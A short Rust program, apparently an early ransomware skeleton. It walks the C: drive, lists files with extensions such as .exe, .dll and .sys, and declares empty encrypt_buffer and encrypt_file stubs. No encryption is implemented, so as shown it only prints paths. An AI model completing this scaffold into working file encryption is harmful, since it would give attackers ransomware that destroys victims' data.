use walkdir::WalkDir;
use lazy_static::lazy_static;
use std::{str, vec};

lazy_static!{
static ref kIncludeBackfix:Vec<&'static str> = vec![".exe",".dll",".png",".jpg",
".bmp", ".txt", ".ini",  ".sys"];

static ref kHardDriver:Vec<&'static str> = vec!["C:"];
}

pub fn encrypt_buffer() {

}

pub fn encrypt_file(){
    
}

fn main() -> Result<(),walkdir::Error>{
    
    for HardDriver in kHardDriver.iter(){

    for entry in WalkDir::new(HardDriver) {

        match entry{
            Ok(DirEntry)  => {

                // 判断指定文件是否符合目标后缀
                let BackfixInclude = false;
                for iter in kIncludeBackfix.iter(){
                    if(DirEntry.file_name().to_str().unwrap().ends_with(iter)){
                        // 打印文件
                        println!("{}", DirEntry.path().display());
                    }
                }
                
            },
            Err(error) => {
                
            }
        }
	}
    }

Ok(())
}
